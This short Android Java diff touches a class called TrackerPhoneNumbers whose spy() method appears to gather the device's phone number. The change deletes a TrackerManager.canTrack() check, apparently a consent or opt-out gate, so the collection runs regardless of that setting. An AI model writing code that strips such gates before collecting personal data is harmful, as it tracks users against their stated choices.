@@ -9,11 +9,9 @@ import android.telephony.TelephonyManager;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-class TrackerPhoneNumbers implements TrackerMethod {
+class TrackerPhoneNumbers extends TrackerMethod {
     @Override
     public void spy() {
-        if (!TrackerManager.canTrack()) return;
-
         TelephonyManager tMgr = (TelephonyManager) TrackerManager.get().getSystemService(Context.TELEPHONY_SERVICE);
         if (ActivityCompat.checkSelfPermission(TrackerManager.get(), Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED &&
             ActivityCompat.checkSelfPermission(TrackerManager.get(), Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED &&
